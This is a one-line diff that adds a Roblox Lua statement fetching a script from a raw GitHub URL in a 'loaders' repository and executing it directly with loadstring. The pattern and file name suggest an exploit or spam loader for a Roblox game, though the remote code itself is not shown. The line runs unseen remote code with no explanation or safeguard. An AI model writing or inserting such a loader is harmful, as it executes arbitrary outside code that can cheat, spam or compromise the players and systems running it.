@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/ro-scale-sandbox-spam7-exr77h5no91nox.lua"))()
